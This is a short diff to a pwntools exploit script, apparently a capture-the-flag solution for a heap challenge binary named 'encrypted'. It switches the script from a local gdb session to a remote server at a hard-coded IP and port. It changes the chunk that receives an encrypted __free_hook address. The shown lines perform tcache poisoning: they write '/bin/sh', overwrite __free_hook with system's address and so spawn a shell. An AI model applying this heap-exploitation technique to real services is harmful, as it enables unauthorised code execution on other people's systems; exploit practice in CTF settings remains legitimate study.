@@ -14,14 +14,14 @@ continue
 #     print(link)
 # print(elf.sym.__libc_system) 
 # print(elf.sym.__free_hook)
-pwn.context.terminal = ['tmux', 'splitw', '-h']
+# pwn.context.terminal = ['tmux', 'splitw', '-h']
 binaryname = "./encrypted"
 
 # pwn.libcdb.unstrip_libc("./libc.so.6")
 
 #p=process(binaryname)
-#p=remote("207.154.239.148", 1369)
-p=pwn.gdb.debug(binaryname, gdbscript=gs)
+p=pwn.remote("207.154.239.148", 1370)
+# p=pwn.gdb.debug(binaryname, gdbscript=gs)
 # p=pwn.gdb.debug(binaryname)
 # p=pwn.process(binaryname)
 #gdb.attach(p)
@@ -118,7 +118,7 @@ freehook_address = encrypt(glibc_base + freehook_offset, heap_address)
 # input("freezing to check gdb")
 
 edit(4, b"/bin/sh")
-edit(1, pwn.p64(freehook_address))
+edit(3, pwn.p64(freehook_address))
 malloc(10, 24)
 malloc(11, 24)
 edit(11, pwn.p64(system_address))
